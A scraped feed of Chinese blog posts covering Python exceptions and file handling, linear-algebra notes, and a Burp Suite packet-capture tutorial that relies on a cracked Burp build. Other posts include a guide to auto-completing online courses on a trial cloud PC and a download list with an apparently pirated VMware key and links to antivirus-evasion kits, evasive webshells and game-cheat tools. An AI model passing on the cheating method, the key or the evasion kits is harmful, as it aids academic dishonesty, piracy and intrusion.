如果出现异常执行的代码 QuickStart：\n1 2 3 4 try: print(name)\t# 如果直接运行该行代码会报错NameError except NameError as e:\t# 此处as后加变量可以把错误信息赋值给该变量，方便后面print查看等 print(\u0026#39;name变量名称未定义错误\u0026#39;,\u0026#39;错误为：\u0026#39;，e) 捕获多个异常： 基本语法：\n1 2 3 4 try: 可能发生错误的代码 except(异常名称1,异常名称2,异常名称3): 如果出现异常执行的代码 QuickStart：\n1 2 3 4 try: print(1/0) except(NameError,ZeroDivisionError) as e: print(\u0026#39;出错了！\u0026#39;,\u0026#39;错误是：\u0026#39;,e) 捕获全部异常： 第一种： 同 2.1 捕获常规异常 1 2 3 4 try: 可能发生错误的代码 except: 如果出现异常执行的代码 第二种： 1 2 3 4 try: 可能发生错误的代码 except Exception as e:\t# Exception可指代全部异常 如果出现异常执行的代码 异常之else else表示的是如果没有异常要执行的代码。\n1 2 3 4 5 6 try: print(1)\texcept Exception as e: print(e) else: print(\u0026#39;没有错误发生！\u0026#39;) 异常之finally finally表示的是无论是否异常都要执行的代码，例如关闭文件。\n1 2 3 4 5 6 7 8 try: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;r\u0026#39;)\texcept Exception as e: f = open(\u0026#39;test.txt\u0026#39;,\u0026#39;w\u0026#39;) else: print(\u0026#39;没有错误发生！\u0026#39;) finally: f.close() 异常的传递 解释：\n无捕获时： 1 2 3 4 5 6 7 8 9 10 11 12 13 def func01(): print(\u0026#39;这是func01开始\u0026#39;) nmu = 1 / 0 print(\u0026#39;这是func01结束\u0026#39;) def func02(): print(\u0026#39;这是func02开始\u0026#39;) func01() print(\u0026#39;这是func02结束 \u0026#39;) def main(): func02() main() 输出及报错内容：\n这是func02开始\nTraceback (most recent call last):\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 13, in \u0026lt;module\u0026gt;\n这是func01开始\nmain()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 12, in main\nfunc02()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 8, in func02\nfunc01()\nFile \u0026quot;/home/cloudlab/main.py\u0026quot;,line 3, in func01\nnmu = 1 / 0\nZeroDivisionError: division by zero\n注意观察报错中错误所在代码行数的变化，体现了异常的传递\n有捕获时： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def func01(): print(\u0026#39;这是func01开始\u0026#39;) nmu = 1 / 0 print(\u0026#39;这是func01结束\u0026#39;) def func02(): print(\u0026#39;这是func02开始\u0026#39;) func01() print(\u0026#39;这是func02结束 \u0026#39;) def main(): try: func02() except Exception as e: print(\u0026#39;检测到异常!\u0026#39;,e) main() # 输出结果： # 这是func02开始 # 这是func01开始 # 检测到异常! division by zero 输出内容：\n这是func02开始\n这是func01开始\n检测到异常! division by zero\n当函数func01中发生异常,并且没有捕获处理这个异常的时候,异常\n会传递到函数func02,当func02也没有捕获处理这个异常的时候\nmain函数会捕获这个异常,这就是异常的传递性.\n而且代码再按步骤执行时一旦遇到异常就会立即停止接下来的步骤，除非被捕获\n","date":"2025-11-19T22:22:08+08:00","permalink":"https://www.retr0.xyz/p/9.1-%E5%BC%82%E5%B8%B8/","title":"9.1 异常"},{"content":"云服务器/云电脑的获取 方案一：阿里云（免费） 云电脑的购买（领取） 1.访问学生用券中心-阿里云云工开物，登录账号后点击领取 学生300元优惠券\n这期间可能会要求进行实名认证和学生认证，如实填写就好\n这个按钮原本是领取，领完之后就会变成“立即使用”\n2.现在我们往下翻看到下面有无影云电脑这一栏，点击它\n下面有这样几个产品：\n3.我们这里选择第四个：“个人版云电脑核时包：8000核时”，点击立即购买\n等待右面弹窗价格计算完毕为￥0.00元后点击立即购买（如下图）\n云电脑的启用 现在我们已经成功购买了8000核时的时长，但是注意，有时长并不代表我们有云电脑，因为阿里云的云电脑分为两个部分： 设备（有不同配置和有效期）+时长， 不过没关系，针对无影云电脑的新客户，阿里云会赠送有效期一个月的免费体验普通配置设备，但这对于我们仅需要挂机刷课的需求肯定是够的。\n1.接下来我们下载并安装无影云电脑客户端，网站无影客户端下载_无影云电脑_客户端下载_无影-阿里云\n下载Windows版本（如图）\n2.打开“无影云电脑”并登录你的阿里云账号后可以看到软件上方已经显示核时算力8000.0，同时下面有个免费试用的按钮，点击它\n3.在弹出的界面可以看到右下角的“本次应付 ￥0.00”，点击立即下单\n随后的云电脑名称随便填写，常用地就填你所在的地区，这样可以为你分配你附近的服务器，从而大大降低延迟\n用支付宝扫码开通免密支付（不会扣款）\n你肯定已经猜到了，这其实就是常见的首月免费试用，接下来开始扣款的常见方案，所以我们要取消连续订阅。\n4.点击左下角用户里的订单管理\n点击右面的订阅管理\n在弹出的窗口中点击取消连续订阅即可\n如果还是不放心的话可以去支付宝的 **设置-支付设置-自动续费/免密支付-免密支付-阿里云免密支付-关闭服务 **中彻底关闭。\n补充：到期了怎么办？ 别急,请注意我们之前领的是300元的优惠券,但是购买\u0026quot;个人版云电脑核时包：8000核时\u0026ldquo;只花了247.40元,因此我们还剩下52.6元的优惠券没用,好!所以我们现在购买这个产品:\n计算价格后仍为0.00元,这波羊毛是不是薅爽了\n接下来的配置就和上面一样了,不再过多叙述\n方案二:京东云(进阶：一年￥38) 我们访问双11大促-京东云\n这有个38一年的云主机，但是蹲点抢购，看你个人想法吧，实测不是特别难抢\n然后如果抢到了记得配置的时候系统选 Windows Server 2022 数据中心版 即可\n远程连接上跟普通电脑没啥区别\n云电脑的启动与配置 由于我们的需求是挂机刷课，因此要把断连自动关机的功能关闭，因此，我们点击云电脑列表里你刚才购买的云电脑的 管理-策略-断连定时关机/休眠 ，关闭这个开关即可 接下来我们启动云电脑，点击你的云电脑右下角的蓝色圆形按钮远程连接云电脑 进入云电脑桌面后打开Microsoft Edge浏览器，搜索“大学搜题酱插件”，点击如图所示的搜索结果\n在如下图的网页中点击“获取”，然后在上方的小弹窗中点击“添加扩展”\n安装完成后会弹窗让你用“大学搜题酱app”扫码登录\n接下来进入你的学习通后台开启一门（不要同时刷多门）课程即可\n‼️‼️‼️ 注意：云电脑端在刷课时手机端不要进入课程看视频或做题，否则会把云电脑上的账号顶掉,此外,强烈建议每天进入云电脑2-3次检查刷课是否正常,因为长时间刷课可能因为种种原因(如内存溢出,登录失效等)需要重新登录,你只要刷新一下网页重新登录即可.\n","date":"2025-11-18T11:24:14+08:00","image":"https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg","permalink":"https://www.retr0.xyz/p/%E5%85%8D%E8%B4%B9%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E5%9F%BA%E4%BA%8E%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/%E4%BA%91%E7%94%B5%E8%84%91%E7%9A%84%E5%85%A8%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE%E5%B9%B3%E5%8F%B0/","title":"[免费]保姆级教程：基于云服务器/云电脑的全自动刷课平台"},{"content":" 本篇课程使用资源库内的“win10渗透测试工具预安装虚拟机（日常使用）”\n抓包 环境准备 Java环境准备 打开C:\\tools\\alltools\\java环境中的jre-8u261-windows-x64.rar压缩包，解压并安装Java 安装完成后按win+R打开“运行”窗口，输入cmd并回车进入命令行控制台。 分别输入java和javac均有内容返回则说明安装成功。 Burpsuite软件的准备 打开C:\\tools\\alltools\\抓包工具中的Burpsuitepro_Unlimited_jb51.rar压缩包并解压到合适的位置。 在解压的文件夹内创建一个.bat批处理文件用于启动Burpsuite，名称随便，内容为： 1 java -jar BurpUnlimited.jar 双击该批处理文件即可启动Burpsuite,一路next进入软件界面。 检查并确认Options选项卡中监听地址和端口为127.0.0.1:8080 Firefox浏览器的准备（需要开着Burpsuite） 打开Firefox浏览器，并转到选项中，在高级-网络-连接-设置中选择“手动配置代理”并勾选为所有协议使用相同代理，填写好之前获取的地址和端口。 在地址栏输入http://burp/能进入页面说明配置成功，接下来点击页面右上角的‘CA Certificate’按钮保存证书。 再次转到浏览器的选项中，在高级-证书-查看证书-证书机构-导入中选择刚才保存到证书导入，弹窗内全部勾上。 证书机构的列表中多出名为PortSwigger CA的证书则导入成功。 Charles软件的准备（可选） 打开位于C:\\tools\\Charles内的Charles.exe 点击代理选项，可以看到默认勾选了Windows代理，说明Charles默认使用系统代理的方法抓包，也因此能抓取系统上所有软件的http数据包。\n正如上述，我们需要在浏览器的代理设置中更改为：**使用系统代理 **（1.1.3中提到） 因为未知原因，charles的证书不能从本地保存后导入，所以这里我们选择 **帮助-SSL代理-在移动设备或远程浏览器上安装Charles根证书 **点击后出现弹窗，例如： 这里我们只看后面的chls.pro/ssl在浏览器中访问该地址。\n安装证书的操作不再过多叙述。\n抓包实操 Burp抓包 在Burp软件内Proxy-Intercept选项卡中点击Intercept is off开始抓包\n此时在百度上搜索任意关键词（以\u0026quot;test\u0026quot;为例）可以看到抓取到数据包\n修改数据包首行wd参数值为\u0026quot;ok\u0026quot;\n点击Intercept is on放行数据包\n发现搜索关键词被替换为\u0026quot;ok\u0026quot;\nCharles抓包 打开Charles软件并访问百度\n发现抓取到数据包，查看内容发现与页面原代码一致\nweb基本知识 一些术语：\nGET 通过地址栏输入===从服务器获取\nPOST 提交表单===向服务器发送\nrequest 向服务器发起一个请求，服务器会返回一个结果(response)给客户端\n**forward **服务器内部发送重定向（网页发生改变但地址不变）\n**redirect **服务器收到一个请求后，发送一个状态给客户端，客户端会再次请求，此时url发生了改变\n**url **统一资源定位器（链接）\nurl的组成，以百度搜索为例：\nhttps:// www.baidu.com/ s ? wd=test \u0026amp; rsv_spt=1 \u0026amp; issp=1 \u0026amp; f=8\nhttp:// == 协议\nwww.baidu.com == 域名\ns == 文件\n？== get请求\nwd/rsv_spt/issp/f == 参数名\n参数名等号后为参数值\n\u0026amp; == 连接符\n","date":"2025-11-17T15:59:43+08:00","permalink":"https://www.retr0.xyz/p/1.1-%E6%8A%93%E5%8C%85%E5%92%8Cweb%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","title":"1.1 抓包和web基本知识"},{"content":"部分虚拟机的密码在文件名上\n===============================\n日常工具（包含VMware以及其他常用小工具）\n链接：https://pan.baidu.com/s/1Cas0WpP1XkOf8Blh0pOFSw\n提取码：67uq\nvmware激活\nvmware17.5.2激活（本机为win11系统使用）\nMC60H-DWHD5-H80U9-6V85M-8280D\nvmware17.5.2安装参考\nhttps://word.huayunsys.com/thread-688-1-1.html\n=============================\nwin10渗透测试工具预安装虚拟机（日常使用）\nhttps://pan.baidu.com/s/1VydYshBifpLR1U7tLowyBA\n提取码: zy7p\nparrot渗透src工具预安装虚拟机（日常使用）\n链接: https://pan.baidu.com/s/1GOqLxz-tCSIGZrX2TLeaZg\n提取码: qjp7\n=============================\nkali预安装虚拟机系列\nkali2018 x64（预安装）-优先使用（文件传输使用bitvise）\n链接: https://pan.baidu.com/s/10lm6F5UO0q2f16kRVKXRqw\n提取码: 6s8i\nkali 2025-1 x64位（预安装）\n链接: https://pan.baidu.com/s/1gXSP1me3Z6djvsFJjV7-Jw 提取码: c2sd\nkali2023.2 with Clash（需要高版本kali实验以及全局vpn使用）\n链接：https://pan.baidu.com/s/1h-2pY_NmDEWzD5ve_sadLw\n提取码：a7vm\n关于v2ray转clash配置的生成地址\nhttps://acl4ssr-sub.github.io/\nkali 1.0.6 x64位（预安装）\n链接：https://pan.baidu.com/s/1fE6sTVYLNXVi1wokT0GE_w\n提取码：oe8g\n=========================\n空靶机系列\nwin7nosp预安装虚拟机（适合渗透测试实验，自带chrome，phpstudy，无vmwaretools）\n链接：https://pan.baidu.com/s/1ZIEB06P727Fau6afz5zI1A 提取码：pvql\nwin7sp1预安装虚拟机（适合普通实验）\n链接：https://pan.baidu.com/s/1adkc-lYiw2IRc2ztpTWVjg 提取码：dvl5\nwin10预安装虚拟机链接（普通实验靶机）：\n链接: https://pan.baidu.com/s/1qWT4DeG8uujcsjgpeFBWjg 提取码: bpat\n===============================\n特殊实验虚拟机\nsrc挖洞虚拟机\n链接: https://pan.baidu.com/s/1QTZJ1ExIyYKkEEj-hTV8Gw 提取码: mesk\nparrot预安装虚拟机\n链接：https://pan.baidu.com/s/1m9GAPluSlkeb1ul8qYW2ag 提取码：mo8m\nwin2019数据中心版预安装虚拟机\n链接: https://pan.baidu.com/s/1P8VXiwHay9HpA6BshBI6tw 提取码: cbl9\nwin2012标准版预安装虚拟机\n链接: https://pan.baidu.com/s/1leMe8dBmf1A0R9xA-0N0aA 提取码: voou\nwin2008企业版预安装虚拟机+phpstudy\n链接：https://pan.baidu.com/s/1gAhA8A14HL5zXXJTFRGNDQ 提取码：97fa\ncentos7普通预安装虚拟机\n链接: https://pan.baidu.com/s/1vU6w6jJ58C9v9wxnGOEr0Q 提取码: f1c4\ncentos7预安装phpstudy\n链接: https://pan.baidu.com/s/1pol4yliVnnau9LqsM0nUjw 提取码: xtmv\ncentos7预安装redis\n链接: https://pan.baidu.com/s/1sdIu2_96xr5M7xG5EIOivQ 提取码: qyv8\ncentos7预安装docker\n链接: https://pan.baidu.com/s/1bZqqRKEAQH0FdEzxvnHmBA 提取码: 1vr3\n云安全3台centos7预安装k8s\n链接: https://pan.baidu.com/s/1awjXfkR4xRitkenSyPpn_w 提取码: 9ieh\nubuntu x64 20.04.3预安装虚拟机\n链接: https://pan.baidu.com/s/1PIRuo1h4RBxegqYIkMFx2g 提取码: rcsd\n域环境3台虚拟机（用户名密码都在文件名中）\n链接: https://pan.baidu.com/s/1oq4bG4ecWaB97324V91GCw 提取码: 174l\n预安装防火墙Monowall\n链接: https://pan.baidu.com/s/1EBYTLw_U74z6uj18UIA-Yw 提取码: wkvh\n=====================\n特殊情况\n苹果m1芯片win10虚拟机\n链接：https://pan.baidu.com/s/1cRvML1jPv6JfGBYfhAwEkA\n提取码：3r0j\n=========================\n渗透+逆向工程虚拟机\nwin7完整滲透測試+逆向工程工具預安裝虛擬機\n链接：https://pan.baidu.com/s/1r6AhgRLtkciqyUtep7okcA\n提取码：5z9u\n=====================\nctf版win10预安装虚拟机\nwin10-ctf.ova\n链接: https://pan.baidu.com/s/1wGtsdYzBIr4GcnjHxmh4lQ 提取码: pzjj\n=====================\n安全靶场类\n链接：https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg\n提取码：38mj\n代码审计源码类\n链接：https://pan.baidu.com/s/1VU5IZAMXSmSrerN69-502w\n提取码：p7vj\nmisc类\n链接：https://pan.baidu.com/s/10d_oMAABD1sulW83qbDMtA\n提取码：hk03\n数字取证类\n链接：https://pan.baidu.com/s/11yOS0eQajxSnSqQ8xHQFgA\n提取码：qfux\n========================\n逆向工程实验包\nhttps://pan.baidu.com/s/1lwAKPU6leg2A1bJX7LMyUg\n提取码: 8pj5\n=========================\nctf系列实验包\n链接：https://pan.baidu.com/s/1ZPfV05b7AoL4CF2Ex9wHwg\n提取码：qafo\n==========================\nAOME备份还原系统\n链接：https://pan.baidu.com/s/1xwEQC4d0ub5S3pg78fGPrA\n提取码：8cnu\n============================\n游戏外挂辅助学习\n链接: https://pan.baidu.com/s/1MLKND0RapwTPxW2ciOC1Wg\n提取码: h4bm\n免杀工具包\n链接: https://pan.baidu.com/s/17Rd6YAYhgHDv5u7pteWWJw\n提取码: 3f1d\nweb漏洞.rar\n链接: https://pan.baidu.com/s/1YA7RjBa4-ibrkxyhWJfz0A\n提取码: wcgt\n服务攻防\n链接无法分享\n红队工具\nhttps://pan.baidu.com/s/1AYGBjVYVKlDx9AEF_maiPQ\n提取码: em5w\n蓝队工具\nhttps://pan.baidu.com/s/1Zkc1vCsonzZBQ2Q2stZQNA\n提取码: hw32\n免杀webshell\nhttps://pan.baidu.com/s/1plbtPsJllE4fetMcAmtU4g\n提取码: 7inr\n信息收集补充\n链接: https://pan.baidu.com/s/1P8HoH3jMPwTIXf-ji6Scsg\n提取码: gfhg\n云安全工具\n链接: https://pan.baidu.com/s/1l-FMgaccQlrxhFJHakGvNA\n提取码: q9ev\nONE-FOX集成工具箱_V6\n链接: https://pan.baidu.com/s/1gu5Z7z2Ls6wW_8FOSOEH0A\n提取码: exxx\n移动终端工具(密码huayunsys.com).rar\n链接: https://pan.baidu.com/s/1gNQ-okYjgeg7aoz6Cono0Q\n提取码: x227\n===========================\nvulfocus靶场\n链接: https://pan.baidu.com/s/1YPJfsN6WFwA7Q9viE8ejLg\n提取码: wbsv\nsnort2虚拟机\n链接: https://pan.baidu.com/s/1oZpepxjTHY5qLqYb5UD4IQ\n提取码: 4fsi\n雷池虚拟机\n链接: https://pan.baidu.com/s/1tByIap_RTrLPFwKRfAaxBA\n提取码: ceuv\n蜜罐虚拟机\n链接: https://pan.baidu.com/s/1u3EauAmLuILovlcbe-cGnw\n提取码: akvm\nsuicata虚拟机\n链接: https://pan.baidu.com/s/1uImCWMW_LttEbFrEae5n-Q\n提取码: sg9t\njumpserver堡垒机\n链接: https://pan.baidu.com/s/1fUJFAkUPg99f6g72oELVBA\n提取码: gvi5\nMobexler\n链接: https://pan.baidu.com/s/1OFdDyEkyNiWP5ms2IEMrEg\n提取码: 2nm8\nELK日志分析\n链接: https://pan.baidu.com/s/176TUQmmRjwGmuQhuPFLCuw\n提取码: s73m\nHIDS-Wazuh\n链接: https://pan.baidu.com/s/1s7_Xh6XOJ9Ea648gJnOeNw\n提取码: e6rv\n==========================\nwin10-java8预安装虚拟机\n链接: https://pan.baidu.com/s/1QEAM5-apx8UKn1ZijQZ8IQ\n提取码: m9wd\n===========================\nwin10-vc2022-qt预安装虚拟机\n链接: https://pan.baidu.com/s/18BudoNm569KZk4ildcODJw\n提取码: 79qu win10-ctf虚拟机\n链接: https://pan.baidu.com/s/1ayzi1gzJGmiiNo1KBVo3kA\n提取码: ku4v\n============================\n","date":"2025-11-17T15:58:53+08:00","permalink":"https://www.retr0.xyz/p/0.%E5%AE%89%E5%85%A8%E7%B1%BB%E5%B7%A5%E5%85%B7%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E5%BA%93/","title":"0.安全类工具文件资源库"},{"content":"例： 需求：有一份账单文件，记录了消费收入的具体记录，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 name, date, money, type, remarks 周杰轮,2022-01-01,100000,消费,正式 周杰轮,2022-01-02,300000,收入,正式 周杰轮,2022-01-03,100000,消费,测试 林俊节,2022-01-01,300000,收入,正式 林俊节,2022-01-02,100000,消费,测试 林俊节,2022-01-03,100000,消费,正式 林俊节,2022-01-04,100000,消费,测试 林俊节,2022-01-05,500000,收入,正式 张学油,2022-01-01,100000,消费,正式 张学油,2022-01-02,500000,收入,正式 张学油,2022-01-03,900000,收入,测试 王力鸿,2022-01-01,500000,消费,正式 王力鸿,2022-01-02,300000,消费,测试 王力鸿,2022-01-03,950000,收入,正式 刘德滑,2022-01-01,300000,消费,测试 刘德滑,2022-01-02,100000,消费,正式 刘德滑,2022-01-03,300000,消费,正式 将内容复制保存为bill.txt\n任务：\n读取文件 将文件写出到bill.txt.bak文件作为备份 同时，将文件内标记为测试的数据行丢弃 实现思路：\nopen和r模式打开一个文件对象,并读取文件 open和w模式打开另一个文件对象,用于文件写出 for循环内容,判断是否是测试不是测试就write写出,是测试就continue跳过 将2个文件对象均close() 代码演示：\n1 2 3 4 5 6 7 8 9 10 f = open(\u0026#39;F:/bill.txt\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) g = open(\u0026#39;F:/bill.txt.bak\u0026#39;,\u0026#39;a\u0026#39;,encoding=\u0026#39;UTF-8\u0026#39;) for line in f: if line.count(\u0026#39;测试\u0026#39;) == 0: g.write(line) g.flush() else: continue f.close() g.close() ","date":"2025-11-16T22:37:55+08:00","permalink":"https://www.retr0.xyz/p/8.3-%E7%BB%83%E4%B9%A0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B/","title":"8.3 练习：文件操作的综合案例"},{"content":"文件的从头写入 文件不存在 1 2 3 4 5 6 7 8 9 10 11 # 1.创建文件 f = (open(\u0026#39;python.txt\u0026#39;,\u0026#39;w\u0026#39;)) # 2.文件写入 f.write(\u0026#39;hello world\u0026#39;) # 3.内容刷新 f.flush() # 4.文件关闭 f.close() 注意：\n直接调用write，内容并未真正写入文件，而是会积攒在程序的内存中，称之为缓冲区 当调用flush的时候，内容会真正写入文件 这样做是避免频繁的操作硬盘，导致效率下降（攒一堆，一次性写磁盘） 文件已经存在 w模式会直接打开已有文件并清空所有内容\n其他与上述示例代码相同。\n文件的追加写入 1 2 3 4 5 6 7 8 9 10 11 # 1.打开文件，通过a模式打开即可 f = open(\u0026#39;python.txt\u0026#39;,\u0026#39;a\u0026#39;) # 文件写入 f.write(\u0026#39;hello world\u0026#39;) # 3. 内容刷新 f.flush() # 4.文件关闭 f.close() 注意：\na模式，文件不存在会创建文件 a模式，文件存在会在最后，追加写入文件 换行操作可以通过在写入内容中加入\u0026rsquo;\\n\u0026rsquo; 实现\n紧急补充：二级考点：使用 f.write(\u0026rsquo;,\u0026rsquo;.join(lis) + \u0026ldquo;\\n\u0026rdquo;) 在 Python 中，f.write(','.join(lis) + \u0026quot;\\n\u0026quot;) 是一种将列表内容写入文件的常用方法。它将列表中的元素用逗号连接成字符串，并在末尾添加换行符，然后写入文件。\n示例\n1 2 3 4 5 6 7 # 定义一个列表 lis = [\u0026#34;苹果\u0026#34;, \u0026#34;香蕉\u0026#34;, \u0026#34;橙子\u0026#34;] # 打开文件以写入模式 with open(\u0026#34;fruits.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: # 将列表内容写入文件，每个元素用逗号分隔，末尾添加换行符 f.write(\u0026#39;,\u0026#39;.join(lis) + \u0026#34;\\n\u0026#34;) print(\u0026#34;数据已成功写入文件！\u0026#34;) 运行后文件内容：苹果,香蕉,橙子\n","date":"2025-11-15T21:50:41+08:00","permalink":"https://www.retr0.xyz/p/8.2-%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%99%E5%85%A5%E6%93%8D%E4%BD%9C/","title":"8.2 文件的写入操作"},{"content":"证明两个矩阵等价的核心方法（简要版） 矩阵等价的核心定义：设$A$、$B$为$m \\times n$同型矩阵，若存在$m$阶可逆矩阵$P$和$n$阶可逆矩阵$Q$，使得$PAQ = B$，则$A$与$B$等价。\n关键充要条件（满足其一即可证明） 秩相等：$r(A) = r(B)$（最常用，无需构造可逆矩阵，计算秩即可）； 初等变换互化：$A$可通过有限次初等行/列变换化为$B$； 等价标准形相同：$A$和$B$的等价标准形均为$\\begin{pmatrix} I_r \u0026amp; O \\ O \u0026amp; O \\end{pmatrix}$（$r$为秩，$I_r$为$r$阶单位矩阵）。 简要证明思路 先验证$A$与$B$是同型矩阵（行数、列数一致，否则必不等价）； 任选上述充要条件验证： 便捷法：计算$r(A)$和$r(B)$，若相等则等价； 严谨法：通过初等变换将$A$化为$B$，或构造$P$、$Q$使$PAQ = B$。 ","date":"2025-11-14T23:41:10+08:00","permalink":"https://www.retr0.xyz/p/%E8%AF%81%E6%98%8E%E7%9F%A9%E9%98%B5%E7%AD%89%E4%BB%B7/","title":"证明矩阵等价"},{"content":"一、行列式的核心计算方法及适用情况 1. 定义法 核心思路：直接利用n阶行列式的定义（所有$n!$项的代数和），即：\n$$|A| = \\sum_{p_1p_2\\cdots p_n} (-1)^{\\tau(p_1p_2\\cdots p_n)} a_{1p_1}a_{2p_2}\\cdots a_{np_n}$$\n其中$\\tau$是排列$p_1p_2\\cdots p_n$的逆序数。 适用情况： 1阶、2阶行列式（直接计算，无需简化）； 高阶行列式但零元素极多（非零项仅1-2项，可快速筛选）。 优点：直观、无需额外技巧；缺点：高阶（≥3阶）非零项多，计算量爆炸。 2. 按行（列）展开法（降阶法） 原理：行列式等于它的任意一行(列)各元素与其对应的代数余子式乘积之和，即 $$D=a_{i1}A_{i1}+a_{i2}A_{i3}+ \\cdots +a_{in}A_{in} (i=1,2, \\cdots ,n) $$ 核心思路：利用行列式展开定理，将n阶行列式按某行（列）展开为n个n-1阶行列式的线性组合：\n$$|A| = \\sum_{j=1}^n a_{ij}A_{ij} \\quad (\\text{按第}i\\text{行展开})$$\n其中$A_{ij}=(-1)^{i+j}M_{ij}$（$M_{ij}$为余子式）。 适用情况： 某行（列）零元素≥n-2个（直接展开后计算量小）； 可通过初等变换（如某行加另一行的$k$倍）快速造出一行（列）多零元素。 关键技巧：优先选择零元素最多的行（列）展开，减少计算量。 3. 初等变换法（化三角法） 核心思路：利用行列式的初等变换性质，将行列式化为上三角行列式（主对角线下方全为0）或下三角行列式（主对角线上方全为0），三角行列式的值=主对角线元素乘积：\n$$\\begin{vmatrix} a_{11} \u0026 a_{12} \u0026 \\cdots \u0026 a_{1n} \\\\ 0 \u0026 a_{22} \u0026 \\cdots \u0026 a_{2n} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 \\cdots \u0026 a_{nn} \\end{vmatrix} = a_{11}a_{22}\\cdots a_{nn}$$ 适用情况： 任意n阶行列式（3阶及以上最常用）； 元素无明显规律、零元素少的普通行列式。 常用变换：换行变号、某行乘非零常数、某行加另一行的$k$倍（不改变行列式值）。 4. 递推法 核心思路：通过展开或变换，建立n阶行列式$D_n$与低阶行列式（$D_{n-1}$、$D_{n-2}$）的递推关系（如$D_n = pD_{n-1} + qD_{n-2}$），求解递推公式得结果。 适用情况： 具有带状结构的行列式（如三对角行列式）； 结构对称、元素按规律重复的行列式（如$n$阶循环行列式）。 示例：三对角行列式（主对角线及相邻两条对角线非零，其余为0）：\n$$D_n = \\begin{vmatrix} a \u0026 b \u0026 \u0026 \\\\ c \u0026 a \u0026 b \u0026 \\\\ \u0026 c \u0026 a \u0026 \\ddots \\\\ \u0026 \u0026 \\ddots \u0026 \\ddots \u0026 b \\\\ \u0026 \u0026 \u0026 c \u0026 a \\end{vmatrix}$$\n展开后得递推关系$D_n = aD_{n-1} - bcD_{n-2}$，结合初始条件$D_1=a$、$D_2=a^2-bc$求解。 5. 数学归纳法 核心思路：先验证$n=1$（或$n=2$）时行列式等式成立，假设$n=k$时成立，证明$n=k+1$时也成立，从而推广到所有$n$。 适用情况： 已知行列式结果（需证明）； 结构具有明显递推规律的行列式（如范德蒙德行列式、高阶对称行列式）。 二、特殊结构行列式的专门解法及适用情况 1. 三角/对角行列式（含数量矩阵） 结构特征： 上三角：主对角线下方全为0；下三角：主对角线上方全为0； 对角行列式：仅主对角线非零（三角行列式的特例）。 适用情况：直接符合上述结构，或可通过1-2步初等变换化为该结构。 解法：直接取主对角线元素的乘积，即$|A| = \\prod_{i=1}^n a_{ii}$。 2. 范德蒙德行列式（Vandermonde Determinant） 结构特征：第$i$行（或列）为变量$x_1,x_2,\\cdots,x_n$的0到$n-1$次幂，形式如下：\n$$V_n = \\begin{vmatrix} 1 \u0026 1 \u0026 \\cdots \u0026 1 \\\\ x_1 \u0026 x_2 \u0026 \\cdots \u0026 x_n \\\\ x_1^2 \u0026 x_2^2 \u0026 \\cdots \u0026 x_n^2 \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ x_1^{n-1} \u0026 x_2^{n-1} \u0026 \\cdots \u0026 x_n^{n-1} \\end{vmatrix}$$ 适用情况：完全符合上述结构，或可通过转置、换行（列）调整为该结构（注意换行变号）。 解法：直接套用公式（所有变量两两差的乘积）：\n$$V_n = \\prod_{1 \\leq j \u003c i \\leq n} (x_i - x_j)$$ 关键提醒：若行列式是“列为幂次”，转置后仍为范德蒙德行列式（$|V_n^T|=|V_n|$）。 3. 爪型行列式（星形行列式） 结构特征：主对角线有非零元素，仅第一行、第一列（或最后一行、最后一列）有非零元素，其余为0，形如“爪”：\n$$D_n = \\begin{vmatrix} a_0 \u0026 b_1 \u0026 b_2 \u0026 \\cdots \u0026 b_n \\\\ c_1 \u0026 a_1 \u0026 0 \u0026 \\cdots \u0026 0 \\\\ c_2 \u0026 0 \u0026 a_2 \u0026 \\cdots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ c_n \u0026 0 \u0026 0 \u0026 \\cdots \u0026 a_n \\end{vmatrix} \\quad (a_i \\neq 0)$$ 适用情况：严格符合“主对角线+第一行+第一列”的爪形结构（无其他非零元素）。 解法：消去第一列（或第一行）的非零元素，化为对角行列式：\n第$i$行（$i\\geq2$）减去$\\frac{c_i}{a_i} \\times$第1行，得：\n$$D_n = \\begin{vmatrix} a_0 - \\sum_{i=1}^n \\frac{b_i c_i}{a_i} \u0026 b_1 \u0026 b_2 \u0026 \\cdots \u0026 b_n \\\\ 0 \u0026 a_1 \u0026 0 \u0026 \\cdots \u0026 0 \\\\ 0 \u0026 0 \u0026 a_2 \u0026 \\cdots \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 0 \u0026 \\cdots \u0026 a_n \\end{vmatrix} = \\left( a_0 - \\sum_{i=1}^n \\frac{b_i c_i}{a_i} \\right) \\prod_{i=1}^n a_i$$ 4. 箭型行列式（特殊爪型） 结构特征：仅第一行、最后一行、第一列、最后一列有非零元素，其余为0，形如“箭”：\n$$D_n = \\begin{vmatrix} a \u0026 b \u0026 \u0026 \u0026 c \\\\ d \u0026 a_2 \u0026 \u0026 \u0026 \\\\ \u0026 \u0026 a_3 \u0026 \u0026 \\\\ \u0026 \u0026 \u0026 \\ddots \u0026 \\\\ e \u0026 \u0026 \u0026 \u0026 a_n \\end{vmatrix} \\quad (a_i \\neq 0)$$ 适用情况：符合“四边非零、中间全零”的箭形结构。 